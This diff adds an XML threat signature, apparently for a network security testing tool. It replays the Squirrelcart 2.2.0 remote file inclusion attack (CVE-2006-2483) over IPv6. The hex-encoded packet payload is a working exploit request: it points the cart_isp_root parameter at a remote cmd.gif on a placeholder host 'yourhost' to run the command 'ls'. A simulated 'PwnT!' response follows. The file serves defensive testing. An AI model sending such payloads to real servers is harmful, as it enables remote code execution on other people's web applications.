@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Command_Injection"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Squirrelcart"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Squirrelcart_Squirrelcart"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Squirrelcart_Squirrelcart_2.2.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/1790"/>
+    <CVEID display="true" value="CVE-2006-2483"/>
+    <bugtraqID display="true" value="17992"/>
+    <OSVDB display="true" value="25523"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="e2e414245b28d2e56af21406f5c0f46e" display="true"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="integrity"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236797445"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1151035733" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F636172745F636F6E74656E742E706870253346636172745F6973705F726F6F7425334468747470253341253246253246796F7572686F7374253246636D642E676966253346636D642533446C7320485454502F312E310D0A4163636570743A20746578742F68746D6C2C20746578742F706C61696E2C206170706C69636174696F6E2F782D6F67672C206170706C69636174696F6E2F6F67672C20746578742F766E642E726E2D7265616C746578742C20696D6167652F766E642E726E2D7265616C7069782C206170706C69636174696F6E2F736D696C2C20617564696F2F6D70332C20617564696F2F782D6D70332C20617564696F2F6D7065672C20617564696F2F6D70672C20617564696F2F782D6D7065672C20617564696F2F782D6D70672C20617564696F2F6D70656775726C2C20617564696F2F782D6D70656775726C2C20617564696F2F7761760D0A4163636570742D456E636F64696E673A20677A69702C20636F6D70726573730D0A4163636570742D4C616E67756167653A20656E0D0A557365722D4167656E743A204C796E782F322E382E3572656C2E31206C69627777772D464D2F322E31342053534C2D4D4D2F312E342E31204F70656E53534C2F302E392E37690D0A484F53543A207777772E6578616D706C652E636F6D0D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
